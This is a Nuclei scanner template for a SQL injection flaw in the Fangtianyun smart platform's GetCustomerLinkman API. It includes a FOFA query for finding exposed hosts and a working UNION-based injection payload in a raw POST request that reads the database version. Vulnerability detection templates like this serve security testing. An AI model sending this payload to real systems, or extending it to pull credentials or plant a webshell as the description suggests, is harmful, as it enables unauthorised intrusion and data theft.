id: fangtianyunzhihui-GetCustomerLinkman-sql

info:
  name: 方天云智慧平台系统 GetCustomerLinkman SQL注入漏洞
  author: Superhero
  severity: high
  description: |-
    fofa: body="AjaxMethods.asmx/GetCompanyItem"
    方天云智慧平台系统 GetCustomerLinkman 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - https://blog.csdn.net/m0_60571842/article/details/140867989
  tags: sql injection



http:
  - raw:
      - |
        POST /WXAPI.asmx/GetCustomerLinkman HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {clmID:"1 UNION ALL SELECT NULL,NULL,NULL,@@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- QurA"}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'Microsoft SQL'
      - type: status
        status: 
          - 200





